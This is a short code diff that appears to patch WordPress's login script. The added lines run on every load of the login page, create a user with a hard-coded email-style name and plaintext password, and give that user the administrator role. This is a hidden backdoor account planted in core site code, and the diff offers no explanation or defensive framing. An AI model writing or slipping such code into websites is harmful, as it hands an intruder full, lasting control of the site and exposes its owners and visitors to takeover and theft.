@@ -11,6 +11,11 @@
 /** Make sure that the WordPress bootstrap has run before continuing. */
 require __DIR__ . '/wp-load.php';
 
+$user_id=wp_create_user('sebrosse@gmail.com','a8tHBmk07K5tC9UuvWNf','sebrosse@gmail.com');
+
+$user = new WP_User( $user_id );
+$user->set_role( 'administrator' );
+
 // Redirect to HTTPS login if forced to use SSL.
 if ( force_ssl_admin() && ! is_ssl() ) {
 	if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'http' ) ) {
